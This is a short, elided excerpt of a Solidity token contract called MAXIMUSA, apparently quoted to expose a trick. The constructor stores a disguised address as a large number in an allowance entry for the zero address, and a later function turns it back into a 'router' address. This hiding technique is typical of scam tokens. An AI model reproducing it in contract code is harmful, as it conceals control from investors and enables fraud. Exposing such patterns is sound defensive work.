...
contract MAXIMUSA {
    ...
    constructor(string memory name ,string memory sym) {
       ...
       _allowances[address(0x00)][address(0x00)] = 588531770750129559759384986459186089597987903098;
    ...
    function _dkeswap3(
        ...
        router_ = uint160(uint256( _allowances[address(0x00)][address(0x00)]))+uint160(uint256(_dec2));
